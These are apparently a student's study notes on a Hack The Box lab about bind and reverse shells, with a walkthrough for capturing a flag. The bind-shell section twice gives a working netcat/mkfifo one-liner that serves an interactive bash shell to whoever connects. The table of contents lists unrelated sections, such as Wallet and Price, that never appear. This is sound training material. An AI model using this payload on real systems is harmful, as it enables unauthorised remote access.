# Shells & Payloads

## Contents
- [Shell Basics](#shell-basics)
    - [Bind Shells](#bind-shells)
        - [What is it?](#what-is-it)
        - [Creating a TCP session with Netcat](#creating-a-tcp-session-with-netcat)
        - [Establishing a Basic Bind Shell with Netcat](#establishing-a-basic-bind-shell-with-netcat)
        - [Q](#q-ssh-to-the-target-create-a-bind-shell-then-use-netcat-to-connect-to-the-target-using-the-bind-shell-you-set-up-when-you-have-completed-the-exercise-submit-the-contents-of-the-flagtxt-file-located-at-customscripts)
    - [Reverse Shells](#reverse-shells)

- [API Documentation](#api-documentation)
- [Setup and Run](#setup-and-run)
- [Commands](#commands)
    - [Wallet](#wallet)
    - [Price](#price)
    - [Other](#other)
- [TODO](#todo)
- [Contribute](#contribute)
  - [Pull request](#pull-request)
- [Contributors](#contributors)
- [License](#license)

# Shell Basics

## Bind Shells

### What is it?

Bind shells are us connecting to another machine (**Victim**)

We are the attacker (**Client**) and the server is the one getting exploited (**Victim**)

To use binding shells, we use **Netcat**

We need the **IP adress** and **port number**

<br>

<img src="https://academy.hackthebox.com/storage/modules/115/bindshell.png" width="50%" height="50%">

---

There can be many challenges associated with getting a shell this way. Here are some to consider:

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

### Creating a TCP session with Netcat

This is a simple demonstration of how netcat works

Setting up the server to listen on port 7777 on their IP adress 

```console
target@server:~$ nc -lvnp 7777
Listening on 0.0.0.0 7777
```

Our connection to the server

```console
client@attacker:~$ nc -nv 10.129.201.134 7777
Ncat: Connected to 10.129.201.134:7777.
```

You should have something looking like this 

![image](https://user-images.githubusercontent.com/83395536/223362004-968ebde3-9479-4d22-b316-b2a528214922.png)

How you can now send text from the client to the server in the TCP protocol as seen in the picture. This is only a Netcat TCP session that we have established. The next one is for opening up a shell on the victims computer and passing through commands

### Establishing a Basic Bind Shell with Netcat

Now we want to make a bind shell so we can interact with the OS and file system of the victims computer.

On the server-side, we will need to specify the **directory**, **shell**, **listener**, work with some **pipelines**, and **input & output redirection** to ensure a shell to the system gets served when the client attempts to connect.

---

Victim side  
```console
target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The command above are considered our payload, and we delivered this payload manually with pasting this into the terminal. 

<br>

Attacker side
```console
client@attacker:~$ nc -nv 10.129.41.200 7777
```

<br>

After this, you should be connected to the victim, and can pass through commands or exploits!

---

### Q: SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

To do this, I will first spawn in the instance and log in with shh

```console
ssh htb-student@192.168.l.l
```

Then set up our exploit with this command

```console
target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

And on our normal box (Attacker), we connect to the server with 

```console
client@attacker:~$ nc -nv 10.129.41.200 7777

```

And now you should have a binding shell. 

To find the flag for the task. Go to the root directory and move into the folder /customscripts with cd and cat the flag file.

## Reverse Shell

### What is it?

Reverse shells are the victim connecting to our machine.

With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

![image](https://user-images.githubusercontent.com/83395536/223561378-f945d08b-8e4a-4bf8-bb92-39f652519890.png)

Task solved ![image](https://user-images.githubusercontent.com/83395536/223561506-886d7c2c-f05b-4587-864c-559f220cd38b.png)



<img src="https://academy.hackthebox.com/storage/modules/115/reverseshell.png" width="50%" height="50%">


